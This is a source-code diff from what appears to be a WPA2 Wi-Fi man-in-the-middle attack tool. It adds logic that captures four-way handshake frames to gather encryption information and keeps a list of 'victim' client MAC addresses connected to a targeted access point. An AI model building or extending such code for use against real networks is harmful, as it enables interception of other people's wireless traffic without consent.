@@ -108,6 +108,28 @@ static int fill_encry_info(struct MITM *MITM, const struct WPA2_handshake_packet
 	return 0;
 }
 
+static void maintain_victim_list(struct dl_list *list, char *mac) {
+  struct victim_info *tmp;
+  int match = 0;
+  dl_list_for_each(tmp, list, struct victim_info, victim_node) {
+    if (!memcmp(tmp->mac, mac, ETH_ALEN)) {
+      match = 1;
+      break;
+    }
+  }
+  if (!match) {
+    struct victim_info *new;
+    new = malloc(sizeof(struct victim_info));
+    if (!new) {
+      log_printf(MSG_WARNING, "%s: Alloc memory failed", __func__);
+      return;
+    }
+    memcpy(new->mac, mac, ETH_ALEN);
+    dl_list_add_tail(list, &new->victim_node);
+  }
+  return;
+}
+
 void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *buf, size_t len) {
 	
 	struct MITM *MITM = (struct MITM *)ctx; 
@@ -211,11 +233,21 @@ void handle_four_way_shakehand(void *ctx, const uint8_t *src_addr, const char *b
 			offset += sizeof(struct ieee80211_qos_hdr);
 			
 			parse_llc_header(buf, len , &offset, packet);
-			if (tmp->llc_hdr.type == 0x888e &&
-			   (MITM->state == MITM_state_capture_handshake)) {
-				parse_auth_data(buf, len, &offset, packet);
-				fill_encry_info(MITM, packet);
-			}
+			switch(MITM->state) {
+      case MITM_state_capture_handshake :
+        if (tmp->llc_hdr.type == 0x888e) {
+          parse_auth_data(buf, len, &offset, packet);
+          fill_encry_info(MITM, packet);
+        }
+        break;
+      case MITM_state_ready :;
+        /* Alies */
+        struct ieee80211_qos_hdr* hdr = (struct ieee80211_qos_hdr*)tmp->ieee80211_data;
+        if (!memcmp(hdr->addr1, MITM->encry_info.AA, ETH_ALEN)) {
+            maintain_victim_list(&MITM->victim_list, hdr->addr2);
+        }
+        break;
+      }
 		break;}
 		case IEEE80211_DEAUTHENTICATION :
 		break; 
